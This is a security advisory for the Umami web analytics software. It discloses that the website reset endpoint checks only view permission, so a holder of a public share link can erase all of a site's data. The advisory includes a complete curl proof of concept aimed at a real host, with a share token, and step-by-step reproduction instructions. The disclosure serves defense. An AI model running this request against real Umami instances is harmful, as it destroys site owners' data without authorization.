  "Title": "Anyone with a share link can RESET all website data in Umami",
  "Description": "### Summary\nAnyone with a share link (permissions to view) can reset the website data.\n\n### Details\nWhen a user navigates to a `/share/` URL, he receives a share token which is used for authentication. This token is later verified by `useAuth`. After the token is verified, the user can call most of the `GET` APIs that allow fetching stats about a website.\n\nThe `POST /reset` endpoint is secured using `canViewWebsite` which is the incorrect verification for such destructive action. This makes it possible to completly reset all website data ONLY with view permissions - [permalink](https://github.com/umami-software/umami/blob/7bfbe264852558a148c7741f8637ff2b266d48cd/pages/api/websites/%5Bid%5D/reset.ts#L22) \n\n\n### PoC\n```bash\ncurl -X POST 'https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset' \\\n -H 'authority: analytics.umami.is' \\\n -H 'accept: application/json' \\\n -H 'accept-language: en-US,en;q=0.9' \\\n -H 'authorization: Bearer undefined' \\\n -H 'cache-control: no-cache' \\\n -H 'content-type: application/json' \\\n -H 'pragma: no-cache' \\\n -H 'referer: https://analytics.umami.is/share/bw6MFhkwpwEXFsbd/test' \\\n -H 'sec-ch-ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"' \\\n -H 'sec-ch-ua-mobile: ?0' \\\n -H 'sec-ch-ua-platform: \"Linux\"' \\\n -H 'sec-fetch-dest: empty' \\\n -H 'sec-fetch-mode: cors' \\\n -H 'sec-fetch-site: same-origin' \\\n -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' \\\n -H 'x-umami-share-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWJzaXRlSWQiOiJiODI1MDYxOC1jY2I1LTQ3ZmItODM1MC0zMWM5NjE2OWExOTgiLCJpYXQiOjE2OTAzNjkxOTl9.zTfwFrfggE5na7rOOgkUobEBm48AH_8WVyh2RgJGzcw' \\\n --compressed\n```\n\nYou can reproduce this by:\n* Accessing a website using it's share link\n* Copy the `token` received from the the received from the `GET /share/{website-id}`\n* Send a POST request to `https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset` with `x-umami-share-token: ` header equal to the token copied in the previous step\n* The website data is now cleared\n\n### Impact\nEveryone with an open share link exposed to the internet!",
